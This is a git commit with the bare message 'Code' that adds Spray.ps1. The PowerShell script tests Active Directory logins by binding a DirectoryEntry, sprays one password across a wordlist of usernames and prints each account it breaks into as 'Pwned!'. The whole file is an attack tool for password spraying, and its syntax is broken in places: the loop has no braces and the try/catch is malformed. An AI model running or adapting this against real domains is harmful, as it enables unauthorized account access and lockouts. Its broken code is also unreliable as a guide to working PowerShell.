8f4e416679495027b44ade2ed81d669027302188
Ishan Saha <ishansaha@outlook.com>
2022-12-19 17:10:40 +0530

    Code

---
+++ Spray.ps1
@@ -0,0 +1,20 @@
+
+Function Test-ADAuth {
+    param($username, $password)
+    (New-Object DirectoryServices.DirectoryEntry "",$username,$password).psbase.name -ne $null
+}
+
+function Spray {
+    param ($pass, $wordlist)
+    try{
+    foreach ($uname in [System.IO.File]::ReadLines($wordlist))
+    if (Test-ADAuth -username $uname -password $pass)
+    {
+        echo $uname + ' [*] Pwned!'
+    }
+     catch 
+    {
+        Write-Output "$PSItem"
+    }
+}
+
